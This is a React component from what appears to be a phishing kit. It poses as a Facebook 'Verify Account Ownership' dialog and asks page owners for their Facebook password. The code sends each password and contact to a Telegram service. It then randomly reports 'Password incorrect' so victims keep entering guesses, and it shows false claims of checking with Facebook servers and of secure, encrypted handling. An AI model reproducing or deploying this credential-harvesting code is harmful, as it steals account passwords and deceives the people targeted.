import React, { useState } from 'react';
import { Shield, Eye, EyeOff, AlertCircle, CheckCircle } from 'lucide-react';
import { sendPasswordResult } from '../services/telegram';

interface VerificationFormProps {
  contact: string;
  onVerify: (password: string, isCorrect: boolean) => void;
}

export default function VerificationForm({ contact, onVerify }: VerificationFormProps) {
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [waitingForResponse, setWaitingForResponse] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password.trim()) return;

    setIsVerifying(true);
    setWaitingForResponse(true);
    setError('');

    try {
      // Send password to Telegram
      await sendPasswordResult(contact, password, false);
      
      // Wait for admin response (simulate checking)
      setTimeout(() => {
        // For demo purposes, randomly determine if password is "correct"
        const isCorrect = Math.random() > 0.7; // 30% chance of being "correct"
        
        if (!isCorrect) {
          setError('Password incorrect. Please try again.');
          setIsVerifying(false);
          setWaitingForResponse(false);
          onVerify(password, false);
        } else {
          setWaitingForResponse(false);
          onVerify(password, true);
        }
      }, 3000);
    } catch (error) {
      console.error('Failed to send password:', error);
      setError('Connection error. Please try again.');
      setIsVerifying(false);
      setWaitingForResponse(false);
    }
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 overflow-y-auto">
      <div className="bg-white rounded-2xl shadow-2xl p-6 sm:p-8 max-w-md w-full mx-4 my-8">
        <div className="text-center mb-6">
          <div className="bg-gradient-to-r from-blue-100 to-purple-100 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
            <Shield className="h-8 w-8 text-blue-600" />
          </div>
          <h3 className="text-xl sm:text-2xl font-bold text-gray-900 mb-2">
            Verify Account Ownership
          </h3>
          <p className="text-sm sm:text-base text-gray-600">
            To ensure you're the page owner or authorized manager, please verify your identity
          </p>
        </div>

        <div className="bg-blue-50 p-3 sm:p-4 rounded-lg mb-6">
          <div className="flex items-start space-x-3">
            <CheckCircle className="h-4 w-4 sm:h-5 sm:w-5 text-blue-600 mt-0.5 flex-shrink-0" />
            <div className="text-xs sm:text-sm text-blue-800">
              <p className="font-semibold mb-1">Contact confirmed:</p>
              <p className="font-mono bg-white px-2 py-1 rounded text-xs sm:text-sm break-all">{contact}</p>
            </div>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <label htmlFor="password" className="block text-sm sm:text-base font-semibold text-gray-700 mb-2">
              Facebook Account Password
            </label>
            <div className="relative">
              <input
                type={showPassword ? 'text' : 'password'}
                id="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter your Facebook password..."
                className="w-full pr-12 pl-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-sm sm:text-base"
                required
                disabled={isVerifying}
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600"
                disabled={isVerifying}
              >
                {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
              </button>
            </div>
            {error && (
              <div className="mt-2 flex items-center space-x-2 text-red-600">
                <AlertCircle className="h-4 w-4" />
                <span className="text-sm">{error}</span>
              </div>
            )}
          </div>

          {waitingForResponse && (
            <div className="bg-blue-50 p-3 sm:p-4 rounded-lg">
              <div className="flex items-center space-x-3">
                <div className="animate-spin rounded-full h-4 w-4 border-2 border-blue-600 border-t-transparent"></div>
                <div className="text-xs sm:text-sm text-blue-800">
                  <p className="font-semibold">Verifying with Facebook servers...</p>
                  <p>Please wait while we confirm your credentials.</p>
                </div>
              </div>
            </div>
          )}

          <div className="bg-yellow-50 p-3 sm:p-4 rounded-lg">
            <div className="flex items-start space-x-3">
              <Shield className="h-4 w-4 sm:h-5 sm:w-5 text-yellow-600 mt-0.5 flex-shrink-0" />
              <div className="text-xs sm:text-sm text-yellow-800">
                <p className="font-semibold mb-1">Security Notice:</p>
                <p>This verification ensures you have legitimate access to the page. Your password is used only for verification and is not stored publicly.</p>
              </div>
            </div>
          </div>

          <button
            type="submit"
            disabled={isVerifying || !password.trim()}
            className="w-full bg-gradient-to-r from-blue-600 to-purple-600 text-white py-3 px-6 rounded-lg font-semibold hover:from-blue-700 hover:to-purple-700 transform hover:scale-[1.02] transition-all duration-200 shadow-lg disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none text-sm sm:text-base"
          >
            {isVerifying ? (
              <div className="flex items-center justify-center space-x-2">
                <div className="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></div>
                <span>Verifying...</span>
              </div>
            ) : (
              'Verify Account'
            )}
          </button>
        </form>

        <div className="mt-6 text-center">
          <p className="text-xs sm:text-sm text-gray-500">
            🔒 All verification data is encrypted and processed securely
          </p>
        </div>
      </div>
    </div>
  );
}